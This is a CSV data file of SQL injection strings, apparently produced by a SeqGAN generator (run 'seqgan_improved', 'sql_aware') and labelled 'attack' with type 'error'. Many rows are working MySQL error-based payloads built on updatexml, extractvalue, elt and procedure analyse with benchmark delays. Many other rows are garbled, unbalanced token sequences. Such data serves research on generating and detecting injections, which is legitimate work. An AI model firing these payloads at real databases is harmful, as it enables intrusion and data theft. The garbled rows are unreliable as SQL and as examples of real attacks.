attack,"1"" and extractvalue  (  (  (  (  (  (  (  (  (  3393,concat  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  (  (  e  (  select   (  elt  (  elt  =  a  7982,,  (  select   (  5777  (  (  1808  =  (  (  t  (  1808,  (  (  3393  (  (  0x2e,0x7171706a71,  (  =  9627,md5  (  (  1808  =  (  (  3393  (  (  (  0x5c,0x7171706a71,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1324
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1325
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1326
attack,"1%%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1327
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1328
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1329
attack,"1%""   )    AND or updatexml  (  (  (  (  0x2e,0x7171706a71,  (  (  (  5000000,0x7171706a71,  (  (  (  (  (  (  select   (  eltt  elt  (  1297  =  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  (  5000000,md5  (  (  0x5c,  (  benchmark  (  (  5000000,md5  (  =  (  7982,1   )    (  select   (  case 0 from d an  (  =  6200  =  (  (  8868  )   ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1330
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1331
attack,"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1332
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1333
attack,"1%""   )    )    AND 7757  9338  =  8860  =  9338  )  case 1 and updatexml  (  (  0x2e,0x7171706a71,  (  (  (  (  benchmark  (  (  (  (  (  (  (  5000000,md5  (  (  (  (  (  (  1808=  (  (  (  (  (  (  (  (  0x5c,0x7171706a71(  (  benchmark  (  (  (  5000000(  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,A  (  benchmark  (  0x2e,0x7171706a71,  (  (    (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1334
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1335
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1336
attack,"1%""   )    (  select   (  case from   (  (  3393,concat  (  (  1808  =  (  (  1297  =  (  9627(  select   (  elt  (  el  (  select 0 0 from(  (   SELECT d5 anal  el  )  1808  =  (  3393,1   )    (  extractvalue  (  (  9627,concat  (  (  (  select   (  elt  (  benchmark  (  3863  =  (  1049  =  (  (  0x5c,  (  extractvalue  (  (  9627,md5",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1337
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1338
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1339
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1340
attack,"1 ppCA      0x717a767a71   end  )  case when   (  extractvalue  (  5000000,md5  (  0x2e,md5  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  (  0x5c,  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71  (  updatexml  (  (  (  benchmark  (  5000000  (  (  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  select   (  (  elt  (  elt  (  5000000  (  (  0x2e,0x7171706a71,  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1341
attack,"1%%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1342
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%b""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1343
attack,"1%%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1344
attack,"1%pn%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1345
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  'kbn"" like ""es anal--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1346
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1347
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1348
attack,"1%"",updatexml  (  (  (  (  1297,concat  (  (  (  (  0x5c,md5  (  (  2162   (  (  1808  =  (  0x5c,  (  select   (  3393,0x7171706a71,  (  t  (  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  0x2e,0x7171706a71,  (  select   (  elt  (  case   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1349
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1350
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'zlxxw'  =  'zlx'  =  'jlw",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1351
attack,1%pkpcci,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1352
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1353
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1354
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1355
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1356
attack,"1%"" and extractvalue  (  (  (  3393,select   (  (  eltua  elt  (  0x2e,0x7171706a71,  (  (  benchmark  (  (  5000000,0x7171706a71(  (  =  (  7982,concat  (  (  (  0x2e,  (  (  benchmark  (  (  5000000(  benchmark  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  5000000(  (  1808=  (  (  (  1297  =  8768  (  e  (  0x4b774c75   (  (  elt  )  0x4b774c75   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1357
attack,"1%""   )    )     extractvalue  (  (  (  2162  (  3393,concat  (  (  (  3393,  (  (  5000000,md5  (  (  (  0x5c,0x7171706a71,  (  (  0x2e,  (  benchmark  (  5000000,md5  (  (  select   (  3393,1   )    )    AND 2162  =  1  =  3393  (  (  (  3393,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  e  6581  (  (  3393  =  (  (  0x5c,0x7171706a71,  (  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1358
attack,1%'  =  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1359
attack,"1% where updatexml  (  (  (  (  (  1 extractvalue  (  1297,concat  (  (  (  (  (  (  (  (  (  (  (  (  (  (  (  0x5c,0x7171706a71,updatexml  (  (  (  9627,md5  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  benchmark  (  (     (  )  (  1808,  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  (  (  5000000(  (  (  3393  (  =  (  (  2917(  (  (  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1360
attack,"1"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""ymhn'  =  'zn"" like ""gkn"" like ""kfb_namwb'  =  'ylynanalyte   (  (  (  elt  (  e  0x4b774c75   )    (  extractvalue  (  (  5  (  benchmark  (  (  =  1297,1   (  )   from d5  (  )  elt  (  elt  (  0x5c,0x7171706a71,  (  9627(  (  (  benchmark  (  (  (  concat  (  0x2e,0x7171706a71,  (  (  (  benchmark  (  (  benchmark  (  5000000,m(  (  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1361
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""ikubj)  caseAISTI'i'  8666 else cast  (  (  5847  (  0x2e,md5  (  (  0x5c,0x7171706a71,  (  (  select   (  elta  )  e    (  0x5c,0x7171706a71,  extractvalue  (  (  (  5000000,md5  (  (  0x2e,md5  (  0x2e,m5  (  (  select   (   (   (    (  (  )   (  8375  (  5000000(  benchmark  (   (  (  elt  (  e(  0x5c,  (  5000000(  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1362
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1363
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%si%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1364
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1365
attack," AND updatexml  (  (  3393,concat  (  (  0x5c,1   (  extractvalue  (  (  7982,1   )    uUSRANAME   )    AND 'i'  =  1 else else 5322  (  (  (  (  elt  (  elt  (  3393  =  (  3393,concat  (  (  (  3393,concatt  (  =  (  (  0x4b774c75   end  (  (  elte  g  (  7982  =  (  (  1  )  select   (  5423  (  (  6581  =  (  3393,  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1366
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1367
attack,"select   (  1724  (  5000000,md5  (  benchmark  (  (  5000000(  (  1297=  (  9627,1   from d 0 dual  )   end  (  (  (  elta  elt  (  case when   (  1724  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  select   (  9490  =  3393,1   from duat a  elt  elt  (  1297  )  (   (  (  (  0x2e,0x7171706a71,  (  (  select   (  5989  )  0x5c,0x7171706a71",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1368
attack,"1' and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and 'phf'  =  'k",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1369
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1370
attack,"1%""   )    5 (  extractvalue  (  9627,concat  (  (  (  (  (  benchmark  (  0x5c,0x7171706a71,  (  benchmark  (  =  7997,1   (  4660  7757 and updatexml  (  (  (  (  (  (  (  case  )  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  (  e  (  elt  (  elt  (  0x2e,concat  (  (  select   (  elt  (  7982  =  (  3393,  (  select   (  elt  (   (  case",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1371
attack,"1%'   )    )    AND FROM fmwmonena  (  0x5c,md5  (  0x2e,md5  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  select   (  elt  (  7982  =  3863  (  (  3681t  (  0x2e,0x7171706a71,  (  select   (  elt  (  0x5c)  (  (  0x2e,0x7171706a71(  (  benchmark  (  (  5000000,md5  (  0x2e,md5  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  0x5c,0x7171706a71,  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1372
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1373
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1374
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1375
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1376
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1377
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1378
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%qAND 'i'  (  (  1 from 5740 extractvalue  (  (  8421  (  8862,concat,1 extractvalue  (  (  (  (  (  3393,concat  (  (  (  (  (  (  (  (  =  (  (  (  (  =  (  (0   (  1354  (  (  5989  (  elt  (  1297  =  ,  (  5000000(  (  0x5c,  (  select   (  elt  (  1808  =  (  3393,1   )    AND d5  extractvalue  (  (  1808,concat  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1379
attack,"1%'  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1380
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%""  =  ""      ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1381
attack,"1%  where updatexml  (  (  ut=  2501  (  (  (  0x2e,0x7171706a71,  (  select   (  5423  =  5433  (  (  7982  =  updatexml  (  (  (  1297,1   )    (  extractvalue  (  9627,md5  (  (  0x5c,0x7171706a71,  (  (  (  benchmark  (  (  (  benchmark  (  (  5000000(  (  1808,(  (  (  (  (  0x2e,md5  (  (  (  0x5c,(  (  (  select   (  elt  (  (  1543  (  elt  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1382
attack,"1%""   )    )from duanal  )  )  )  7982  (  (  =  (  0x2e,0x7171706a71,  (  (  9627,concat  (  0x4b774c75   (  7982,1  )  )  (  =  UA7757S5406   (  )    2162 and extractvalue  (  (  (  1808  =  (  3393,md5  =  (  (  2917  =  7050  (  e  (  5000000(  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  (  (  0x2e,0x7171706a71,  (  benchmark  (  (  5000000(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1383
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'w'  =  'kn",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1384
attack," AND 1 where  (  extractvalue  (  9627,concat  (  (  0x2e,0x7171706a71,  (  (  (  select   (  el  (  1297  =  (  3393,1      from dual  )   (  9103  (  (  3393  =  1297,md5  (  =  (  1808,0x717a767a71   (  e(  elt  5777  (  e  (  7982  =  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  8862,md5  (  (  0x5c,  (  (  benchmark  (  (  (  5000000,md5  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1385
attack,1%%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1386
attack,"1"" and extractvalue  (  (  (  (  (  (  (  (  (  (  7982,concat  (  (  =  U  (  select   (  elt  (  (  elt  (  (  3393  =  extractvalue  (  3335  5000000(  (  0x2e,0x7171706a71,  (  5000000,md5  (   (  extractvalue  (    (  (  benchmark  (  benchmark  (  5000000(  7997  (  (  (  1297,concat  (  (  (  (  1759(  (  0x2e,md5  (  (  0x5c,0x7171706a71,(  (  (  benchmark  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1387
attack,"1%'  =  'kbbnenal  )  7529  e  =  (  (  0x5c,  (  0x5c,  (  (  select   (  3393  =  (  5603  =  (  2917,md5  (  (  0x5c,  (  (  5000000,md5  (  (  select   (  e(  elt  (  1808  =  (  1808,concat  (  (  (  benchmark  (  (  (  1297  =  (  1808,concat  (  (  3393  (  (  extractvalue  (  benchmark  (  5000000(  (  select   (  case 0 0x7171706a71u  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1388
attack,"1""   )    AND proceedore anal  el  =  ut  )  1297,1   )    (  extractvalue  (  9627,md5  (  (  (  7982  =  (  0x5c,  (  (  (  select   (  0x2e,0x7171706a715  (  (  eylt  (  0x5c,0x7171706a71,  (  select   (  elt  (  el  (  0x5c,0x717a767a71  (  select   (  (  5198  (  (  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  elt  (  2917",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1389
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1390
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1391
attack,"1%"" and extractvalue  (  (  (  (  (  (  (  (  (  0x5c,0x717a767a71  (  select   (  eltutt  (  el  (  1049  =  1808  7050  (  elt  (  7982  =  (  1   (  case 0 from dual  )   (  5433  (  =  (  7529  (  8862,concat  (  0x2e,0x7171706a71,  (  (  5000000(  (  1808,concat  (  (  (  (  (  0x5c,0x7171706a71,0x7171706a71,  (  =  (  9627,concat  (  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1392
attack,"select   (  utl  9836  )  (  (  3393  =  (  1808,md5  =  5198  (  (  5740  =  3393  (  (  (  (  select   (  elt  (  elt  (  2917  =  (  3393,1 0 from d d5 0 from d5704u1812   (  )  (  6166  )   (  5603   (  (  5433  =  9836  (  7982,1   )    wst from dual  el  el_all  )  =  1   )    5  (  extractvalue",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1393
attack,"1%""   )    procedures anal  el  )  0x5c,  (  (  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  select   (  elt  (  8862  =  (  3393,1   )    ual  )  1559  (  select   (  5423 else from   (  6166  (  (  0x2e,0x7171706a71,  (  select   (  elt  )  7982  =  (  1808,1   (  extractvalue  (  9255,1   (  extractvalue  (  (  7982,1   )    )     )",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1394
attack,"1%%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""n3681je",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1395
attack,"1%'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1396
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1397
attack,"1%'   )    )    AND AND w  (  select   (  case 0 from duale  )   SELECT dual  )   end  (   (  (  select   (  (  e  (  elt  e  (  0x2e,md5  (  (  5000000,md5  (  0x2e,md5  =  (  (  0x5c,0x7171706a71,  (  (  (  benchmark  (  (  5000000,md5  (  0x5c,md5  (  (  select   (  elt  (  elt  (  =  2917,1   and updatexml  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1398
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1399
attack,"1  )1updatexml  (  3393,concat  (  benchmark  (  (  (  5000000(  (  (  (  (  0x2e,0x7171706a71,  (  5000000(  select   (  elt  (  7982  =  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  (  1049  =  (  (  (  1808  =  (  (  0x2e,0x7171706a71,  (  =  (  9627,concat  (  (  extractvalue  (  (  select   (  e(  0x2e,0x7171706a71,  (  (  select   (  elt  (  0x4b774c75   )    (    (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1400
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1401
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,1402
